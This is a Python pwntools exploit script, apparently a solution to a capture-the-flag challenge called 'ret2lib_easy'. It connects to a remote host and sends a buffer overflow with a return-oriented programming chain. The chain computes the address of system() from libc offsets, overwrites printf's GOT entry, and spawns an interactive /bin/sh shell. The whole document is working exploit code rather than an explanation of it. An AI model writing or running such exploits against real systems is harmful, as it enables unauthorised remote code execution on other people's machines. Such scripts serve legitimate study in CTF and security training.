#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11004

yuan = remote(host , port)
#yuan = process('./ret2lib_easy')


#cmd = sys.argv[1] + '\0'

yuan.sendline("6295592")

readaddr = 0x7fb6d14ee7b0
libc_read_offset = 0x00000000000f69a0
libc_system_offset = 0x0000000000045380
systemaddr = hex(readaddr - libc_read_offset + libc_system_offset)
#p += p64(0x400773)

read_plt = 0x4005b0
read_got = 0x601028
printf_plt = 0x4005a0
printf_got = 0x601020
memcpy_plt = 0x4005f0
pppr = 0x4008be #pop r13 ; pop r14 ; pop r15 ; ret
write_addr = 0x601058 #.data

p = "a" * 56

#p += p64(0x7fffafffe130) #~~~

#p += p64(read_plt)
#p += "aaaaaaaa"
#p += "bbbbbbbb"
p += p64(0x000773)
p += p64(pppr)
p += p64(0x0) #stdin
p += p64(write_addr)
p += p64(0x8)
p += p64(read_plt)

p += p64(pppr)
p += p64(0x0) #stdin
p += p64(printf_got)
p += p64(0x8)
p += p64(read_plt)

p += p64(pppr)
p += p64(write_addr)
p += p64(0x1)
p += p64(0x1)
p += p64(printf_got)

yuan.sendline(p)

yuan.send("/bin/sh")
yuan.send(p64(int(systemaddr,16)))



yuan.interactive()

